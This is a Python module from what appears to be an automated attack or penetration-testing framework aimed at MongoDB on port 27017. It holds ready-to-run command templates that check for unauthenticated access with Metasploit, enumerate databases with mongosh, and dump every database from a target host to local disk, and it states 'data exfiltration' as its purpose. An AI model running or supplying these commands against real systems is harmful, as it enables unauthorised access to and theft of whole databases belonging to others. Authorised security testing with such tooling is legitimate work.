"""
MongoDB Exploit Module — Port 27017
"""
MODULE_INFO = {
    "port": 27017, "service": "mongodb",
    "name": "MongoDB Exploit Module",
    "description": "Unauthenticated MongoDB access, database enumeration, and data exfiltration",
    "author": "Custom", "mitre": ["T1190", "T1005"],
}

EXPLOITS = [
    {"name": "MongoDB Unauthenticated Login", "source": "metasploit", "type": "auxiliary",
     "msf_module": "auxiliary/scanner/mongodb/mongodb_login",
     "description": "Checks for unauthenticated access — a critical misconfiguration in MongoDB",
     "exec_command": "msfconsole -q -x 'use auxiliary/scanner/mongodb/mongodb_login; set RHOSTS {target}; run; exit'",
     "risk": "Critical — unauthenticated MongoDB exposes all databases and collections"},
    {"name": "MongoDB Shell Connection", "source": "custom", "type": "exploit",
     "msf_module": "",
     "description": "Connects to MongoDB shell for database enumeration and data extraction",
     "exec_command": "mongosh --host {target} --eval 'db.adminCommand({listDatabases:1})'",
     "risk": "Critical — shell access gives full database control"},
    {"name": "MongoDB Database Dump", "source": "custom", "type": "exploit",
     "msf_module": "",
     "description": "Dumps all databases to local filesystem for offline analysis",
     "exec_command": "mongodump --host {target} --out /tmp/mongodump_{target}",
     "risk": "Critical — complete database exfiltration"},
    {"name": "MongoDB Ransomware Check", "source": "custom", "type": "auxiliary",
     "msf_module": "",
     "description": "Checks for signs of previous MongoDB ransomware attacks (README collections)",
     "exec_command": "mongosh --host {target} --eval 'db.getSiblingDB(\"admin\").getCollectionNames()' --quiet",
     "risk": "High — exposed MongoDB instances are frequently targeted by ransomware bots"},
]

def enumerate(target_ip, service_info=None):
    return list(EXPLOITS)

def exploit(target_ip, port=27017, exploit_info=None):
    ei = exploit_info or EXPLOITS[0]
    return {"command": ei["exec_command"].format(target=target_ip),
            "module": ei.get("msf_module", ""), "status": "ready",
            "target": f"{target_ip}:{port}"}
